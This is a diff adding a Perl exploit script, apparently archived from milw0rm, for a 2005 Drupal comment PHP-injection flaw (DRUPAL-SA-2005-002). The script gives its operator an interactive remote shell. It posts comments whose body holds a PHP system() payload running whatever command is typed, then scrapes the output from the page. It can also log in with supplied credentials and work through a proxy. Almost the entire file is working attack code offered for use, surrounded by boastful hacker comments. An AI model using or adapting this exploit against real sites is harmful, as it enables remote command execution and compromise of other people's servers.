@@ -1,0 +1,141 @@
+#!/usr/bin/perl
+# Mon Jul  4 18:19:35 CEST 2005 dab@digitalsec.net
+#
+# DRUPAL-SA-2005-002 php injection in comments (yes, its lame)
+# Hax0r code here, read before execute
+#
+# Run without arguments to show the help.
+#
+# BLINK! BLINK! BLINK! BLINK!
+#
+# Feel free to port to another stupid script language (mIRC,
+# python, TCL or orthers), and send to securiteam (AGAIN)
+# 
+# Theo, this one hasn't been tested in BSD.. yet!
+# infohacking: there're a lot of xss in drupal, contact me if you want 
+# to program some exploits.
+#
+# BLINK! BLINK! BLINK! BLINK!
+#
+#
+# HERE YOU CAN PUT YOUR BANNER!!!! THOUSENDS OF PEOPLE IS READING THIS LINE
+# contact me for pricing and offerings.
+#
+# !dSR: yubiiiiii yeooooooooooo
+#
+use LWP::UserAgent;
+use HTTP::Cookies;
+use LWP::Simple;
+use HTTP::Request::Common "POST";
+use HTTP::Response;
+use Getopt::Long;
+use strict;
+
+$| = 1; # ;1 = |$
+
+my ($proxy,$proxy_user,$proxy_pass);
+my ($host,$debug,$drupal_user,$drupal_pass);
+my $options = GetOptions (
+  'host=s'		     => \$host, 
+  'proxy=s'           => \$proxy,
+  'proxy_user=s'      => \$proxy_user,
+  'proxy_pass=s'      => \$proxy_pass,
+  'drupal_user=s'      => \$drupal_user,
+  'drupal_pass=s'      => \$drupal_pass,
+	'debug'         	 => \$debug);
+
+&help unless ($host);
+
+while (1){
+    print "druppy461\$ ";
+    my $cmd = <STDIN>;
+    &druppy($cmd);
+}
+exit (1); # could be replaced with exit(2)
+
+
+sub druppy {
+    chomp (my $cmd = shift);
+    LWP::Debug::level('+') if $debug;
+
+    my $ua = new LWP::UserAgent(
+            cookie_jar=> { file => "$$.cookie" });   # this is a random feature
+    $ua->agent("Morzilla/5.0 (THIS IS AN EXPLOIT. IDS, PLZ, Gr4b ME!!!");
+
+    if ($drupal_user) { # no need to exploit 
+        my ($mhost, $h);
+        if ($host =~ /(http:\/\/.*?)\?q=/) {
+            $mhost = $1;
+            $h = $mhost . "?q=user/login";
+        } #some magic hacking here
+        else { 
+            $host =~ /(.*?)\/.*?\//; $mhost =$1;
+            $h = $mhost . "/user/login";
+        }
+        print $h . "\n" if $debug; 
+        my $req = POST $h,[
+            'edit[name]' => "$drupal_user",
+            'edit[pass]' => "$drupal_pass"
+                ]; #grab these, and send to dsr!
+        print $req->as_string() if $debug;
+        my $res = $ua->request($req);
+        print $res->content() if $debug;
+        if ($res->is_redirect eq 1) {
+            print "Logged\n" if $debug;
+        }
+    }
+
+    $ua->proxy(['http'] => $proxy) if $proxy;
+    my $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;
+    my $res = $ua->get("$host");
+    my $html = $res->content();
+    my @op; # buffer overflow here
+    foreach (split(/\n/,$html)) { 
+        if ( m/name="op" value="(.*?)"/){
+            push(@op,$1);
+        }
+    }# xss here
+
+    my $ok = 0; # globlal for admin purposes
+    foreach my $op (@op) {
+        my $req = POST "$host",[
+            'edit[subject]' => 'test',
+            'edit[comment]' => 
+             "<?php print(\"BLAH\\n\");system(\"$cmd\"); print(\"BLAH\\n\");  php?>",
+            'edit[format]' => '2',
+            'edit[cid]' => "", # drupal is sick.. it doesn't need arguments
+            'edit[pid]' => "", # they use it to grab some statistycal information
+            'edit[nid]' => "", # about users conduits. Don't buy in internet using drupal
+            'op' => "$op"
+                ];
+
+        print $req->as_string() if $debug;
+        my $res = $ua->request($req);
+        my $html = $res->content(); 
+        print $html if $debug;
+        foreach (split(/\n/,$html)) {
+            return if $ok gt "1";       # super hack de phrack
+            if (/BLAH/) { $ok++; next }
+            print "$_\n" if $ok eq "1"; # /n is for another line in screen
+        }
+    }
+}
+
+
+sub help {
+    print "Syntax: ./$0 <url> [options]\n";
+    print "\t--drupal_user, --drupal_pass  (needed if dont allow anonymous posts)\n";
+    print "\t--proxy (http), --proxy_user, --proxy_pass\n";
+    print "\t--debug\n";
+    print "\nExample\n";
+    print "bash# $0 --host=http://www.server.com/?q=comment/reply/1\n";
+    print "\n";
+    exit(1);
+}
+
+
+#sub 0day_solaris {
+# please put your code here
+#}
+
+# milw0rm.com [2005-07-05]
